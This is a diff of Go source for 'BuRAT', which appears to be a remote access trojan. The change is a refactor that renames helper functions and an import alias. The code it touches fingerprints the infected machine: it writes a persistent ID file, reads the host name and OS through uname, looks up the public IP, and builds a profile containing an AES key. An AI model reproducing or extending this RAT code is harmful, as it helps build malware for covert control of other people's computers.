@@ -13,7 +13,7 @@ import(
   "io/ioutil"
   "runtime"
   "net/http"
-  o "os"
+  "os"
   "os/exec"
   "strings"
   "time"
@@ -81,9 +81,9 @@ type BuRAT interface {
 
 func NewBuRAT() *buRAT {
   b := &buRAT {
-    id: id(),
-    host: host(),
-    os: os(),
+    id: _id(),
+    host: _host(),
+    os: _os(),
     ip: "unknown",
     status: "offline",
     _internals: _internals {
@@ -117,7 +117,7 @@ func (b *buRAT) Profile() string {
     Id: b.id,
     Host: b.host,
     Os: b.os,
-    Ip: ip(),
+    Ip: _ip(),
     Status: b.status,
     Aes: _aes {
       Key: b._internals.AES.Key(),
@@ -188,21 +188,21 @@ func (b *buRAT) digestTopic(topic string) string {
   return topic
 }
 
-func id() string {
+func _id() string {
   var id string
 
-  filePath := o.TempDir() + "/bushi"
+  filePath := os.TempDir() + "/bushi"
 
-  if _, err := o.Stat(filePath); o.IsNotExist(err) {
+  if _, err := os.Stat(filePath); os.IsNotExist(err) {
     id, _ = randomHex(2)
     data := []byte(id)
-    file, err := o.OpenFile(filePath, o.O_RDWR|o.O_CREATE, 0755)
+    file, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0755)
     if err != nil { fmt.Println(err) }
   	_, err = file.WriteAt(data, 0)
   	if err := file.Close(); err != nil { fmt.Println(err) }
   } else {
     data := make([]byte, 4)
-  	file, err := o.OpenFile(filePath, o.O_RDWR|o.O_CREATE, 0755)
+  	file, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0755)
     if err != nil { fmt.Println(err) }
   	file.ReadAt(data, 0)
     if err := file.Close(); err != nil { fmt.Println(err) }
@@ -212,7 +212,7 @@ func id() string {
   return id
 }
 
-func host() string {
+func _host() string {
   switch os := runtime.GOOS; os {
 	case "linux":
     nodename, _ := exec.Command("uname", "-n").Output()
@@ -227,7 +227,7 @@ func host() string {
 	}
 }
 
-func os() string {
+func _os() string {
   switch os := runtime.GOOS; os {
 	case "linux":
     os, _ := exec.Command("uname", "-sr").Output()
@@ -240,7 +240,7 @@ func os() string {
 	}
 }
 
-func ip() string {
+func _ip() string {
   resp, err := http.Get("http://whatismyip.akamai.com")
   if err != nil { panic(err) }
   defer resp.Body.Close()
